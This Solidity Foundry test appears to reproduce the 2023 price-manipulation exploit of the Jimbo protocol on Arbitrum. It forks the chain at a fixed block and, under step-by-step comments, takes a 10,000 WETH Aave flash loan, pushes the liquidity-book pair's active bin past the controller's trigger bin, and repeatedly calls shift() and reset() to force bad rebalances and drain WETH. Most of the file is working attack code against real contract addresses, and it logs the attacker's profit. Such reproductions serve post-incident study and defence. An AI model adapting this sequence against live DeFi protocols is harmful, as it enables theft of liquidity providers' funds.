// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/cryptofishx/status/1662888991446941697
// https://docs.jimbosprotocol.xyz/protocol/liquidity-rebalancing-scenarios
// https://twitter.com/yicunhui2/status/1663793958781353985
// @TX
// https://arbiscan.io/tx/0xf9baf8cee8973cf9700ae1b1f41c625d7a2abdbcbc222582d24a8f2f790d0b5a
// https://arbiscan.io/tx/0xfda5464e97043a2d0093cbed6d0a64f6a86049f5e9608c014396a7390188670e
// https://arbiscan.io/tx/0x3c6e053faecd331883641c1d23c9d9d37d065e4f9c4086e94a3c34bf8702618a
// https://arbiscan.io/tx/0x44a0f5650a038ab522087c02f734b80e6c748afb207995e757ed67ca037a5eda
// @Summary
// Protocol-specific price manipulation

interface IJimboController {
    function shift() external;
    function reset() external;
    function anchorBin() external view returns (uint24);
    function triggerBin() external view returns (uint24);
}

interface ILBPair {
    function getActiveId() external view returns (uint24 activeId);

    function getBin(uint24 id) external view returns (uint128 binReserveX, uint128 binReserveY);

    function getSwapIn(
        uint128 amountOut,
        bool swapForY
    ) external view returns (uint128 amountIn, uint128 amountOutLeft, uint128 fee);
}

interface ILBRouter {
    enum Version {
        V1,
        V2,
        V2_1
    }

    /**
     * @dev The liquidity parameters, such as:
     * - tokenX: The address of token X
     * - tokenY: The address of token Y
     * - binStep: The bin step of the pair
     * - amountX: The amount to send of token X
     * - amountY: The amount to send of token Y
     * - amountXMin: The min amount of token X added to liquidity
     * - amountYMin: The min amount of token Y added to liquidity
     * - activeIdDesired: The active id that user wants to add liquidity from
     * - idSlippage: The number of id that are allowed to slip
     * - deltaIds: The list of delta ids to add liquidity (`deltaId = activeId - desiredId`) //@note: wrong comment here, should be `activeId + deltaId = desireId`
     * - distributionX: The distribution of tokenX with sum(distributionX) = 100e18 (100%) or 0 (0%)
     * - distributionY: The distribution of tokenY with sum(distributionY) = 100e18 (100%) or 0 (0%)
     * - to: The address of the recipient
     * - refundTo: The address of the recipient of the refunded tokens if too much tokens are sent
     * - deadline: The deadline of the transaction
     */
    struct LiquidityParameters {
        IERC20 tokenX;
        IERC20 tokenY;
        uint256 binStep;
        uint256 amountX;
        uint256 amountY;
        uint256 amountXMin;
        uint256 amountYMin;
        uint256 activeIdDesired;
        uint256 idSlippage;
        int256[] deltaIds;
        uint256[] distributionX;
        uint256[] distributionY;
        address to;
        address refundTo;
        uint256 deadline;
    }
    /**
     * @dev The path parameters, such as:
     * - pairBinSteps: The list of bin steps of the pairs to go through
     * - versions: The list of versions of the pairs to go through
     * - tokenPath: The list of tokens in the path to go through
     */

    struct Path {
        uint256[] pairBinSteps;
        Version[] versions;
        IERC20[] tokenPath;
    }

    function addLiquidity(LiquidityParameters calldata liquidityParameters)
        external
        returns (
            uint256 amountXAdded,
            uint256 amountYAdded,
            uint256 amountXLeft,
            uint256 amountYLeft,
            uint256[] memory depositIds,
            uint256[] memory liquidityMinted
        );
    function swapExactTokensForNATIVE(
        uint256 amountIn,
        uint256 amountOutMinNATIVE,
        Path memory path,
        address payable to,
        uint256 deadline
    ) external returns (uint256 amountOut);

    function swapExactNATIVEForTokens(
        uint256 amountOutMin,
        Path memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountOut);

    function swapNATIVEForExactTokens(
        uint256 amountOut,
        Path memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amountsIn);

    function swapTokensForExactNATIVE(
        uint256 amountOut,
        uint256 amountInMax,
        Path memory path,
        address payable to,
        uint256 deadline
    ) external returns (uint256[] memory amountsIn);
}

contract JimboExp is Test {
    IJimboController controller = IJimboController(0x271944d9D8CA831F7c0dBCb20C4ee482376d6DE7);
    ILBPair pair = ILBPair(0x16a5D28b20A3FddEcdcaf02DF4b3935734df1A1f);
    ILBRouter router = ILBRouter(0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30);

    IAaveFlashloan pool = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    WETH9 weth = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 Jimbo = IERC20(0xC3813645Ad2Ea0AC9D4d72D77c3755ac3B819e38);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 95_144_404);
        deal(address(this), 0);
    }

    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker WETH Balance", weth.balanceOf(address(this)), 18);

        weth.approve(address(pool), type(uint256).max);

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);

        assets[0] = address(weth);
        amounts[0] = 10_000 ether;
        modes[0] = 0;

        pool.flashLoan(address(this), assets, amounts, modes, address(0), abi.encodePacked(uint16(0x3230)), 0);

        emit log_named_decimal_uint("[End] Attacker WETH Balance", weth.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        weth.approve(address(router), type(uint256).max);
        Jimbo.approve(address(router), type(uint256).max);
        weth.withdraw(10_000 ether);

        // Step1: add Liquidity to a high bin
        uint256[] memory steps = new uint256[](1);
        ILBRouter.Version[] memory version = new ILBRouter.Version[](1);
        IERC20[] memory tokenPath = new IERC20[](2);

        steps[0] = 100;
        version[0] = ILBRouter.Version.V2_1;
        tokenPath[0] = IERC20(address(weth));
        tokenPath[1] = Jimbo;

        ILBRouter.Path memory path = ILBRouter.Path(steps, version, tokenPath);
        router.swapNATIVEForExactTokens{value: 10 ether}(1 ether, path, address(this), block.timestamp + 100);

        uint24 activeId = pair.getActiveId();
        uint256 amount1 = Jimbo.balanceOf(address(this));

        int256[] memory deltaIds = new int256[](1);
        uint256[] memory distributionX = new uint256[](1);
        uint256[] memory distributionY = new uint256[](1);

        deltaIds[0] = int256(uint256(uint24((1 << 23) - 1) - activeId));
        distributionX[0] = 1e18;
        distributionY[0] = 0;

        ILBRouter.LiquidityParameters memory parameter1 = ILBRouter.LiquidityParameters(
            Jimbo,
            IERC20(address(weth)),
            100,
            amount1,
            0,
            0,
            0,
            activeId,
            0,
            deltaIds,
            distributionX,
            distributionY,
            address(this),
            address(this),
            block.timestamp + 100
        );

        router.addLiquidity(parameter1);

        // Step2: trigger the `triggerBin`
        activeId = pair.getActiveId();
        uint24 triggerBin = controller.triggerBin();
        uint256 amountOut = 0;
        for (uint24 i = activeId; i <= triggerBin; ++i) {
            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(i);
            amountOut += binReserveX;
            //if (i == triggerBin) amountOut += (binReserveX / 10);
        }

        router.swapNATIVEForExactTokens{value: address(this).balance}(
            amountOut + 1, path, address(this), block.timestamp + 100
        );
        activeId = pair.getActiveId();
        triggerBin = controller.triggerBin();
        require(activeId > triggerBin, "not above triggerBin");

        // Step3: shift
        controller.shift();

        // Step4: buy All normal Jimbo
        amountOut = 0;
        for (uint24 j = 0; j <= 50; ++j) {
            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(j + activeId);
            amountOut += binReserveX;
        }
        // (uint128 binReserveX,) = pair.getBin(activeId1 + 896);
        // amountOut += uint256(binReserveX / 2);
        router.swapNATIVEForExactTokens{value: address(this).balance}(
            amountOut + 1, path, address(this), block.timestamp + 100
        );

        require(pair.getActiveId() == 8_388_607, "wrong");

        // Step5: shift back
        Jimbo.transfer(address(controller), 100);
        controller.shift();

        uint24 anchorBin = controller.anchorBin();

        path.tokenPath[1] = path.tokenPath[0];
        path.tokenPath[0] = Jimbo;

        while (pair.getActiveId() >= anchorBin) {
            amountOut = 0;
            for (uint24 j = pair.getActiveId(); j >= anchorBin; --j) {
                (, uint128 binReserveY) = pair.getBin(j);
                amountOut += binReserveY;
            }
            (uint256 amountIn,,) = pair.getSwapIn(uint128(amountOut), true);
            router.swapExactTokensForNATIVE(amountIn + 1, 0, path, payable(this), block.timestamp + 100);
        }

        require(pair.getActiveId() < anchorBin, "wrong2");

        // Step6 reset to be plain
        controller.reset();

        // Step7: buy to High again
        activeId = pair.getActiveId();
        amountOut = 0;
        for (uint24 j = 0; j <= 50; ++j) {
            (uint128 binReserveX, uint128 binReserveY) = pair.getBin(j + activeId);
            amountOut += binReserveX;
        }
        path.tokenPath[0] = path.tokenPath[1];
        path.tokenPath[1] = Jimbo;

        router.swapNATIVEForExactTokens{value: address(this).balance}(
            amountOut + 1, path, address(this), block.timestamp + 100
        );

        // Step8: shift back
        Jimbo.transfer(address(controller), 100);
        controller.shift();

        // Step9: swap back
        path.tokenPath[1] = path.tokenPath[0];
        path.tokenPath[0] = Jimbo;

        router.swapExactTokensForNATIVE(Jimbo.balanceOf(address(this)), 0, path, payable(this), block.timestamp + 100);

        // end
        weth.deposit{value: address(this).balance}();

        return true;
    }

    receive() external payable {}
}
